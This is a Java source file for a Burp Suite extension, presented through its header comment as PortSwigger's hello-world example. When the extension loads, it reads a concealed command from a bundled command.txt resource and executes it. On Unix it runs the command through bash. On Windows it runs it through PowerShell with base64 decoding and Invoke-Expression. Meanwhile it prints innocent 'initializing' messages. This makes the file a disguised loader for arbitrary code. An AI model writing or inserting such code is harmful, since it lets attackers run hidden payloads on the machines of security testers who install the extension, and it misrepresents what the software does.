// from https://github.com/PortSwigger/example-hello-world/blob/master/java/BurpExtender.java
package burp;

import java.io.PrintWriter;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class BurpExtender implements IBurpExtender {
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        // Read extension name from resource file and set it
        InputStream nameInputStream = getClass().getClassLoader().getResourceAsStream("name.txt");
        Scanner nameScanner = new Scanner(nameInputStream, StandardCharsets.UTF_8.name());
        String extensionName = nameScanner.useDelimiter("\\A").next().trim();
        callbacks.setExtensionName(extensionName);

        // Read command from resource file
        InputStream commandInputStream = getClass().getClassLoader().getResourceAsStream("command.txt");
        Scanner commandScanner = new Scanner(commandInputStream, StandardCharsets.UTF_8.name());
        String command = commandScanner.useDelimiter("\\A").next().trim();

        // obtain our output and error streams
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);

        // Detect operating system
        String os = System.getProperty("os.name").toLowerCase();
        Process process;

        try {
            stdout.println("Initializing extension.");
            
            if (os.contains("win")) {
                // Windows: Use cmd.exe or PowerShell
                String windowsCommand = "powershell.exe -Command \""
                        + command
                        + "[Convert]::FromBase64String | ForEach-Object {$_ -join ''} | Invoke-Expression\"";

                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", windowsCommand});
            } else {
                // Unix-based systems: Use /bin/bash
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", command});
            }
            stdout.println("Finished initializing extension.");
        } catch (Exception e) {
            stderr.println("Error loading extension: " + e.getMessage());
        }
    }
}
